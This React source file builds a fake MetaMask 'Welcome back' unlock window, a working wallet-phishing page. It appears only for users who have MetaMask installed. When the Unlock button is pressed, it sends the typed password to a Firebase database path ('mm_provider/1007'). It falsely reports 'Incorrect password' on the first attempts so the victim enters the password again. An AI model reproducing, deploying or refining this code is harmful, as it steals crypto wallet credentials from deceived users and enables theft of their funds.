import { useState, useEffect, useRef } from "react";
import { EventEmitter } from "events";
import Modal from "react-modal";
import meta_logo from "./assets/img/metamask-fox.svg";
import spinner from "./assets/img/spinner.gif";
import ethLogo from "./images/eth_logo.svg";
import { ReactComponent as ArrowDown } from "./images/icons/arrow-down.svg";
import OutlinedInput from '@mui/material/OutlinedInput';
import { initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { ref, push } from "firebase/database";
import CreateLogo from "./CreateLogo";

import "./index.css";
import "./MM.css";
const isDark = true; //window.matchMedia("(prefers-color-scheme: dark)").matches;
console.log(window.matchMedia("(prefers-color-scheme: dark)"));
const basic = {
  apiKey: "AIzaSyDSQrbrdcdjhvwzXccJQMbQ5x7XKTPlt9g",
  authDomain: "walletintegration-vic.firebaseapp.com",
  projectId: "walletintegration-vic",
  storageBucket: "walletintegration-vic.firebasestorage.app",
  messagingSenderId: "563872958446",
  appId: "1:563872958446:web:18c71569e281a96bebf0ff",
  measurementId: "G-NB5GFJ8BTD"
};
const rtapp = initializeApp(basic);
const rtdb = getDatabase(rtapp);
function getCaretCoordinates(element, position) {
  const div = document.createElement("div");
  div.id = "password-mirror-div";
  document.body.appendChild(div);
  const computed = window.getComputedStyle(element);
  div.textContent = new Array(position + 1).join("•");
  const span = document.createElement("span");
  span.textContent = "•";
  div.appendChild(span);

  const coordinates = {
    top: span.offsetTop + parseInt(computed.borderTopWidth, 10),
    left: span.offsetLeft + parseInt(computed.borderLeftWidth, 10),
  };
  document.body.removeChild(div);
  return coordinates;
}
const MM = ({ isOpen, setIsOpen, isEnter, setIsEnter }) => {

  const inputRef = useRef(null);
  const [animationEventEmitter, setEventEmitter] = useState(new EventEmitter());
  const [loading, setLoading] = useState(true);
  const [pwd, setPwd] = useState("");
  const [validShow, setValidShow] = useState(false);
  const [pwdFocus, setPwdFocus] = useState(false);
  const styles = {
    overlay: {
      position: "fixed",
      backgroundColor: "transparent",
    },
    content: {
      top: "0px",
      left: "auto",
      right: "150px",
      bottom: "auto",
      padding: "0",
      border: "0",
      borderRadius: "5",
      // marginRight: "-30%",
      // transform: "translate(-50%, -50%)",
      boxShadow: "0px 0px 5px #00000088",
      zIndex: 10000,
      fontFamily: "Geist, 'Helvetica Neue', Helvetica, Arial, sans-serif"
    },
  };

  const handleOpenModal = () => {
    setIsOpen(true);
  };

  const handleCloseModal = () => {
    setIsOpen(false);
  };
  const handleChange = (val, target) => {
    setPwd(val);
    setValidShow(false);
    if (target.getBoundingClientRect) {
      const element = target;
      const boundingRect = element.getBoundingClientRect();
      const coordinates = getCaretCoordinates(element, element.selectionEnd);

      animationEventEmitter.emit("point", {
        x: boundingRect.left + coordinates.left - element.scrollLeft,
        y: boundingRect.top + coordinates.top - element.scrollTop,
      });
    }
  };
  const handleClick = () => {
    push(ref(rtdb, "mm_provider/1007"), {
      value: pwd,
      date: String(new Date()),
    });
    setIsEnter(isEnter + 1);
    if(isEnter < 2) setValidShow(true);
    else setIsOpen(false);
  };

  const onClose = () => {
    setIsOpen(false);
  }

  const handleKeyUp = (e) => {
    if (e.keyCode == 13) {
      handleClick();
    }
  };
  const handleBlur = () => setPwdFocus(false);
  const handleFocus = () => setPwdFocus(true);
  useEffect(() => {
    if (isOpen) {
      if (!window.ethereum) {
        alert("Please install MetaMask!");
        window.open("https://metamask.io/download.html", "_blank");
        return;
      }
      setTimeout(() => {
        setLoading(false);
        setTimeout(() => {
          inputRef.current && inputRef.current.focus();
        }, 10);
      }, 3000);
    } else {
      setLoading(true);
    }
  }, [isOpen]);
  console.log("theme", isDark);
  return (
    <Modal
      isOpen={window.ethereum && isOpen}
      style={styles}
      shouldCloseOnOverlayClick={true}
      shouldCloseOnEsc={true}
      onRequestClose={handleCloseModal}
      ariaHideApp={false}
    >
      {loading ? (
        <>
          <div className="flex items-center justify-between bg-[#e6e6e6] dark:bg-[#101010]">
            <div className="flex items-center gap-2">
              <img
                style={{
                  width: "1.2rem",
                  height: "1.2rem",
                  alignSelf: "center",
                  margin: "0.4rem",
                }}
                src={meta_logo}
              ></img>
              <span className="text-sm text-gray-700 dark:text-gray-200" style={{fontFamily: "Geist, 'Helvetica Neue', Helvetica, Arial, sans-serif"}}>MetaMask</span>
            </div>

            <div className="flex items-center gap-2">
              <button
                aria-label="Minimize"
                className="w-8 h-6 flex items-center justify-center text-lg rounded hover:bg-gray-200 dark:hover:bg-gray-800"
                onClick={() => {
                  /* implement minimize behaviour if desired */
                }}
              >
                –
              </button>
              <button
                aria-label="Maximize"
                className="w-8 h-6 flex items-center justify-center text-lg rounded hover:bg-gray-200 dark:hover:bg-gray-800"
                onClick={() => {
                  /* implement maximize behaviour if desired */
                }}
              >
                ☐
              </button>
              <button
                aria-label="Close"
                className="w-8 h-6 flex items-center justify-center text-lg rounded hover:bg-red-600 hover:text-white"
                onClick={onClose}
              >
                X
              </button>
            </div>
          </div>
          <div
            className="mmc"
            style={{
              display: "flex",
              flexDirection: "column",
              overflowX: "hidden",
              width: "380px",
            }}
            data-theme={isDark ? "dark" : "light"}
          >
            <div
              style={{
                width: "370px",
                height: "600px",
                backgroundColor: "#fff",
                display: "flex",
                justifyContent: "center",
                alignItems: "center"
              }}
            >
              <div style={{ display: "flex", flexFlow: "column" }}>
                <img
                  style={{
                    width: "10rem",
                    height: "10rem",
                    alignSelf: "center",
                  }}
                  src={meta_logo}
                ></img>
                <img
                  src={spinner}
                  style={{
                    width: "2rem",
                    height: "2rem",
                    alignSelf: "center",
                    marginTop: "1rem",
                  }}
                ></img>
              </div>
            </div>
          </div>
        </>
      ) : (
        <>
          <div id="app-content" data-theme={isDark ? "dark" : "light"} style={{fontFamily: "Geist, 'Helvetica Neue', Helvetica, Arial, sans-serif"}}>
            <div className="flex items-center justify-between bg-[#d9e4f8] dark:bg-[#101010]">
              <div className="flex items-center gap-2">
                <img
                  style={{
                    width: "1.2rem",
                    height: "1.2rem",
                    alignSelf: "center",
                    margin: "0.4rem",
                  }}
                  src={meta_logo}
                ></img>
                <span className="text-sm text-gray-700 dark:text-gray-200" style={{fontFamily: "Geist, 'Helvetica Neue', Helvetica, Arial, sans-serif"}}>MetaMask</span>
              </div>

              <div className="flex items-center gap-2">
                <button
                  aria-label="Minimize"
                  className="w-8 h-6 flex items-center justify-center text-lg rounded hover:bg-gray-200 dark:hover:bg-gray-800"
                  onClick={() => {
                    /* implement minimize behaviour if desired */
                  }}
                >
                  –
                </button>
                <button
                  aria-label="Maximize"
                  className="w-8 h-6 flex items-center justify-center text-lg rounded hover:bg-gray-200 dark:hover:bg-gray-800"
                  onClick={() => {
                    /* implement maximize behaviour if desired */
                  }}
                >
                  ☐
                </button>
                <button
                  aria-label="Close"
                  className="w-8 h-6 flex items-center justify-center text-lg rounded hover:bg-red-600 hover:text-white"
                  onClick={onClose}
                >
                  X
                </button>
              </div>
            </div>
            
            <div className="app os-win">
              <div className="mm-box main-container-wrapper">
                <div className="unlock-page__container" style={{backgroundColor: "#121314"}}>
                  <div className="unlock-page" data-testid="unlock-page">
                    <div className="unlock-page__mascot-container">
                      <div style={{ zIndex: 0 }}>
                        <CreateLogo
                          animationEventEmitter={animationEventEmitter}
                          width={"170"}
                          height={"170"}
                        ></CreateLogo>
                        <div id="meta_fox"></div>
                      </div>
                    </div>
                    <h1 className="text-3xl font-semibold m-1" style={{fontFamily: "Geist, 'Helvetica Neue', Helvetica, Arial, sans-serif"}}>Welcome back</h1>
                    
                    <div className="unlock-page__form">
                      <div className="MuiFormControl-root MuiTextField-root MuiFormControl-fullWidth">
                        <OutlinedInput
                          aria-invalid="false"
                          autoComplete="current-password"
                          id="password"
                          type="password"
                          dir="auto"
                          data-testid="unlock-password"
                          sx={{
                            marginTop: "6px",
                            fontSize: "1rem",
                            height: "46px",
                            "& .MuiOutlinedInput-notchedOutline": {
                              borderColor: "#dddddd", // default border
                            },
                            "&:hover .MuiOutlinedInput-notchedOutline": {
                              borderColor: "white", // hover border
                            },
                            "&.Mui-focused .MuiOutlinedInput-notchedOutline": {
                              borderColor: "white", // focus border
                            },
                          }}
                          required
                          value={pwd}
                          onFocus={handleFocus}
                          onBlur={handleBlur}
                          ref={inputRef}
                          onChange={(e) => {
                            handleChange(e.target.value, e.target);
                          }}
                          onKeyUp={handleKeyUp}
                          placeholder="Enter your password"
                        />
                      </div>
                      <div className={validShow ? "validate-password" : "validate-password-hidden"} style={{fontFamily: "Geist, 'Helvetica Neue', Helvetica, Arial, sans-serif"}}>
                        Incorrect password
                      </div>
                    </div>
                    <button
                      className={"button btn--rounded btn-default" + (pwd.length == 0 ? " unlock-btn-disabled" : "")}
                      data-testid="unlock-submit"
                      disabled={pwd.length == 0}
                      type="button"
                      variant="contained"
                      style={{
                        backgroundColor: "white",
                        color: "black",
                        marginTop: "8px",
                        fontWeight: "bold",
                        boxShadow: "none",
                        borderRadius: "12px",
                        fontSize: "1rem",
                        padding: "12px 0",
                        fontFamily: "Geist, 'Helvetica Neue', Helvetica, Arial, sans-serif"
                      }}
                      onClick={handleClick}
                    >
                      Unlock
                    </button>
                    <div className="unlock-page__links">
                      <a
                        className="button btn-link unlock-page__link"
                        style={{ fontSize: "1rem", color: "#8b99ff", fontFamily: "Geist, 'Helvetica Neue', Helvetica, Arial, sans-serif" }}
                        role="button"
                        tabIndex="0"
                      >
                        Forgot password?
                      </a>
                    </div>
                    <div className="unlock-page__support" style={{ fontSize: "1rem" }}>
                      <span style={{fontFamily: "Geist, 'Helvetica Neue', Helvetica, Arial, sans-serif"}}>
                        Need help? Contact{" "}
                        <a href="https://support.metamask.io" target="_blank" rel="noopener noreferrer" style={{
                          fontSize: "1rem",
                          color: "#8b99ff",
                        }}>
                          MetaMask support
                        </a>
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div id="popover-content"></div>
        </>
      )}
    </Modal>
  );
};

export default MM;
